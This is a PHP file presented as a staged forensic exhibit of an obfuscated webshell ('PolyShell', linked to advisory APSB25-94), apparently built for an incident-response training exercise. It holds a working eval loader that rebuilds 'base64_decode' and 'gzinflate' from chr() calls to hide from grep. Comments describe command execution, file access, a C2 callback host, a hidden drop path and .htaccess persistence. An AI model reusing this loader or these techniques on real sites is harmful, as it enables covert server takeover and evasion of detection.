<?php
// staged exhibit — APSB25-94 public advisory reconstruction — NOT customer data
// 2-layer obfuscation typical of PolyShell variants observed post-APSB25-94:
//   outer: chr() ladder for function-name reconstruction + 4-chunk base64
//          concatenation (defeats naive `grep gzinflate` / `grep base64_decode`)
//   inner: raw DEFLATE (gzinflate over base64_decode) — yields a command-router
//          stub that dispatches on $_POST['c'] with a `BL-STAGE` key gate
// The inner payload is NON-FUNCTIONAL by design: it echoes a sentinel string for
// each dispatched key but never invokes system(), exec(), passthru(), or eval()
// against user input. Intent reconstructor (Day 4) walks both layers and reads
// the dormant-capability comments below as the "what this would do if armed"
// reference. Do NOT arm this file.
//
// Variant deltas vs host-2 (same actor, same family, second drop):
//   - drop path: /var/www/html/pub/media/catalog/product/cache/.bin/a.php
//   - chunked base64 strings differ from host-2 (per-drop polymorphism is part
//     of the family signature; loader and dispatch table are stable)
//   - C2 callback hostname unchanged (vagqea4wrlkdg.top) — corroborating
//     attribution signal across hosts
//
// dormant-capability markers (commented for exhibit; DO NOT execute or uncomment):
//   - cmd exec     : $_POST['c'] → system() / passthru() / popen()
//   - file r/w     : $_GET['a']  → file_get_contents() / file_put_contents()
//   - callback     : curl POST to a synthesized .top C2 (vagqea4wrlkdg.top —
//                    same hostname as host-2; no real domain)
//   - persistence  : chmod 0644 on sibling .htaccess, AddType PHP on .jpg
$_y=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
$_z=chr(103).chr(122).chr(105).chr(110).chr(102).chr(108).chr(97).chr(116).chr(101);
$_b1="VEpKLEqs0lDKVNK2VUopLSosTcwryUxMVlLKL0jJzC9KzcvJTM5MUSpL";
$_b2="rUjMSU0syVJSyk1MysxJzVNSTC4qTczLLEpMV9JNScxNzs9LL8rOTC1S";
$_b3="0lFKTczNzcgvSi3OzEvNUVHKLE7JL9LOzc8tLs1MzVbSV0otzs8tSEzN";
$_b4="UbJWqKqwqLctytauVrZWylYrTczKKi0qzc/PVcoMyMzMjXNqUzuwAA==";
$_q=$_b1.$_b2.$_b3.$_b4;
$_p=$_z($_y($_q));   // placeholder decode — $_p resolves to a router stub that
                     // returns "BL-STAGE" sentinels; no user input ever reaches
                     // system()/eval() in this staged exhibit
eval($_p);
?>
